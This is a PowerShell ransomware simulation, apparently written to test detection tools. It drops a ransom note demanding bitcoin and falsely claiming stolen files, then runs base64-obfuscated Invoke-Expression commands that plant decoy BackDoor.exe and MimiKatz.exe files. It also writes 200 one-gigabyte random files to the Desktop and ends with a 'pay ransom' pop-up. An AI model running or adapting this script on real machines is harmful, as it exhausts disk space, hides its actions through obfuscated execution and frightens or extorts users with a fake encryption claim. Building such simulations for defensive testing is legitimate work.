@"
 _____                  _        _                _             
/  __ \                | |      | |              | |            
| /  \/_ __ _   _ _ __ | |_ ___ | |     ___   ___| | _____ _ __ 
| |   | '__| | | | '_ \| __/ _ \| |    / _ \ / __| |/ / _ \ '__|
| \__/\ |  | |_| | |_) | || (_) | |___| (_) | (__|   <  __/ |   
 \____/_|   \__, | .__/ \__\___/\_____/\___/ \___|_|\_\___|_|   
             __/ | |                                            
            |___/|_|     By: Nutt

The file system has been encrypted with my CryptoLocker, at this 
point restarting/turning off the machine will cause a boot 
failure. Your best chance is to leave it on an pay the measly 
ransom of `$1000 USD to below bitcoin wallet.

By the way the entire machines contents have already been 
securely uploaded to a server in which I control and will 
examine and release files at a later point if not paid.

Be sure to include the message text in the payment to make sure 
I can unlock your machine and destroy files.

Pay to:  j8az0rvscjc4ruvf4fogargmovzu8x8ermo
Amount:  0.04083600281686747 BTC
Message: $env:computername
                                        
"@ | Out-File -FilePath $env:USERPROFILE\Desktop\~Ransom.txt

#Creates the a fake backdoor file called BackDoor.exe and puts it in specified location, the next commented line is the base64 encoded command below it
#1..1 | % { $out = new-object byte[] 3741824; (new-object Random).NextBytes($out); [IO.File]::WriteAllBytes("C:\Windows\Temp\BackDoor.exe", $out) }
$encodedCommand1 = 'MQAuAC4AMQAgAHwAIAAlACAAewAgACQAbwB1AHQAIAA9ACAAbgBlAHcALQBvAGIAagBlAGMAdAAgAGIAeQB0AGUAWwBdACAAMwA3ADQAMQA4ADIANAA7ACAAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAUgBhAG4AZABvAG0AKQ
AuAE4AZQB4AHQAQgB5AHQAZQBzACgAJABvAHUAdAApADsAIABbAEkATwAuAEYAaQBsAGUAXQA6ADoAVwByAGkAdABlAEEAbABsAEIAeQB0AGUAcwAoACIAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAXABCAGEAYwBr
AEQAbwBvAHIALgBlAHgAZQAiACwAIAAkAG8AdQB0ACkAIAB9AA=='
Invoke-Expression ([System.Text.Encoding]::Unicode.GetString([convert]::FromBase64String($encodedCommand1)))

#Create a file called MimiKatz that will trigger Rapid7 and puts it in specified location, the next commented line is the base64 encoded command below it
#1..1 | % { $out = new-object byte[] 73741824; (new-object Random).NextBytes($out); [IO.File]::WriteAllBytes("$env:APPDATA\MimiKatz.exe", $out) }
$encodedCommand2 = 'MQAuAC4AMQAgAHwAIAAlACAAewAgACQAbwB1AHQAIAA9ACAAbgBlAHcALQBvAGIAagBlAGMAdAAgAGIAeQB0AGUAWwBdACAANwAzADcANAAxADgAMgA0ADsAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABSAGEAbgBkAG8AbQ
ApAC4ATgBlAHgAdABCAHkAdABlAHMAKAAkAG8AdQB0ACkAOwAgAFsASQBPAC4ARgBpAGwAZQBdADoAOgBXAHIAaQB0AGUAQQBsAGwAQgB5AHQAZQBzACgAIgAkAGUAbgB2ADoAQQBQAFAARABBAFQAQQBcAE0AaQBtAGkASwBh
AHQAegAuAGUAeABlACIALAAgACQAbwB1AHQAKQAgAH0A'
Invoke-Expression ([System.Text.Encoding]::Unicode.GetString([convert]::FromBase64String($encodedCommand2)))

try
{
    1..200 | % { $out = new-object byte[] 1073741824; (new-object Random).NextBytes($out); [IO.File]::WriteAllBytes("$env:USERPROFILE\Desktop\Encrypted.$_.bin", $out) }
}
finally
{
    #Show Pop-Up Window
    Add-Type -AssemblyName PresentationCore,PresentationFramework
    $ButtonType = [System.Windows.MessageBoxButton]::OK
    $MessageboxTitle = “Machine Encrypted - Pay Ransom”
    $Messageboxbody = “Please read ~Ransom.txt file on your desktop for furter instructions.”
    $MessageIcon = [System.Windows.MessageBoxImage]::Warning
    [System.Windows.MessageBox]::Show($Messageboxbody,$MessageboxTitle,$ButtonType,$messageicon)
}
